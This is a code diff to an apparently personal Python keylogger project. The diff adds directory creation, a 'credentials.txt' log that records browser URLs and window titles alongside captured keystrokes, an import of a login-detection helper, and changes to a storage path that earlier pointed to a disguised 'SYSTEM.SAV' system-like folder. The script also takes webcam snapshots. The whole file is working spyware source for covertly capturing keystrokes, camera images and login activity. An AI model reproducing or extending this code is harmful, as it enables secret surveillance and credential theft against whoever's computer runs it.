@@ -1,7 +1,8 @@
-from Feature import (Get_activeApp_Data,
+from Feature import (get_activeApp_Data,
                      Take_Screenshots,
                      take_snapshot,
-                     url_detection)
+                     url_detection,
+                     login_detection)
 from pynput.keyboard import Listener, Key
 from datetime import datetime
 from pathlib import Path
@@ -19,14 +20,17 @@ def datetime_updater():
 current_date, current_time = datetime_updater()
 TIMESTAMP = f"{current_date} \n {current_time}"
 
-Main_dir = Path(f"C:/SYSTEM.SAV/Syslogs/Data_{current_date}")
+
+# Main_dir = Path(f"C:\SYSTEM.SAV\Util\Syslog\Data_{current_date}")
+Main_dir = Path(f"F:\Coding\Python\CyberSce_Project\Syslog_{current_date}")
 
 keylogger_dir = os.path.join(Main_dir, f"Keylogs_{current_date}")
 KEYLOG_FILE = os.path.join(keylogger_dir, "Keylogs.txt")
 
 SNAPSHOTS_dir = os.path.join(Main_dir, "CamShots")
 
-LOGIN_FILE = os.path.join(Main_dir, "login.txt")
+LOGIN_FILE = os.path.join(Main_dir, "Login")
+cred_file = os.path.join(LOGIN_FILE, "credentials.txt")
 
 EXIT_COMBO = {Key.cmd, Key.backspace}
 
@@ -104,7 +108,16 @@ file_lock = threading.Lock()
 key_buffer = []
 
 def file_handler():
-    pass
+    os.makedirs(Main_dir, exist_ok=True)
+    print(f"[+] Created/Verified main dir: {Main_dir}")
+    child_dirs = [
+        keylogger_dir,
+        SNAPSHOTS_dir,
+        LOGIN_FILE
+    ]
+    for child in child_dirs:
+        os.makedirs(child, exist_ok=True)
+        print(f"[+] Created/Verified child dir: {child}")
 
 def flush_buffer():
     global key_buffer
@@ -162,32 +175,39 @@ def cam_Shots():
     print(f"Image saved successfully at {snapshot_path}")
     take_snapshot(snapshot_path)
 
-def update_active_app(): 
+def update_active_app():
     global current_process
     prev_process = None
-    browser_process_names = ["chrome.exe", "firefox.exe", "msedge.exe", "safari.exe", "brave.exe", "opera.exe"]
-    
+    prev_title = None
+    prev_url = None
+    browser_list = ["chrome.exe", "firefox.exe", "msedge.exe", "safari.exe", "brave.exe", "opera.exe"]
+
     while True:
         try:
-            hwnd, process_title, process_name = Get_activeApp_Data()
+            hwnd, process_title, process_name = get_activeApp_Data()
             url = None
-
-            if process_name != prev_process:
+            if process_title.strip() != prev_title or process_name != prev_process:
                 flush_buffer()
-                current_process = f"\nProcess: {process_name} \nTitle: {process_title}"
+                current_process = f"\n\nProcess: {process_name} \nTitle: {process_title}"
                 with file_lock:
                     with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
-                        if process_name in browser_process_names:
-                            url = url_detection(hwnd)
-                            f.write(f"{current_process}\nUrl: {url if url else 'Unable to retrieve URL'}\n\n")
-                            print(f"Browser detected: {current_process}")
-                        elif process_title == "":
-                            f.write("\nProcess: None \nTitle: No app running on foreground\n\n")
-                            print("No app running on foreground")
+                        if process_title == "":
+                            f.write("\n\nProcess: None \nTitle: No app running on foreground\n\n")
+                            print("No app running on foreground\n\n")
                         else:
-                            f.write(f"{current_process}\n\n")
-                            print(f"Active app changed: {current_process}")
+                            f.write(f"{current_process}")
+                            print(f"{current_process}")
                 prev_process = process_name
+                prev_title = process_title
+            if process_name in browser_list:
+                url = url_detection(hwnd, process_name)
+                if url and url != prev_url:
+                    with file_lock:
+                        with open(cred_file, 'a', encoding='utf8') as f:
+                            url_log = f"\n\nProcess: {process_name} \nTitle: {process_title}\nURL : {url}"
+                            f.write(url_log)
+                            print(url_log)
+                    prev_url = url
             time.sleep(1)
         except Exception as e:
             current_process = f"Error detecting app: {e}"
@@ -211,7 +231,7 @@ def main():
         os.makedirs(keylogger_dir, exist_ok=True)
         print("=" * 20, "Starting Keylogger", f"{TIMESTAMP}", "=" * 20)
         
-        threading.Thread(target=take_SS, daemon=True).start()
+        # threading.Thread(target=take_SS, daemon=True).start()
         threading.Thread(target=update_active_app, daemon=True).start()
         if once != False:
             threading.Thread(target=cam_Shots, daemon=True).start()
@@ -232,6 +252,7 @@ def main():
                 f.write(error_msg)
 
 if __name__ == "__main__":
+    file_handler()
     main()
 
 '''
